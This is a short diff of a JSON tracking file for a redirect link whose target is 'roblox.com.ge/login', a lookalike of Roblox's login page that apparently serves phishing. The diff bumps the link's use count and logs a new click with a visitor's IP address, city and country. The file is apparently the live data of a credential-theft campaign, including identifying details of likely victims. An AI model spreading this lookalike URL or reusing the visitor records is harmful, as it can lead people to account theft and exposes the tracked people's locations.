@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1342,
+    "useCount": 1343,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10899,6 +10899,14 @@
       },
       {
         "timestamp": 1777412588186,
+        "ip": "76.36.95.82",
+        "country": "United States",
+        "city": "Florence",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777412597808,
         "ip": "76.36.95.82",
         "country": "United States",
         "city": "Florence",
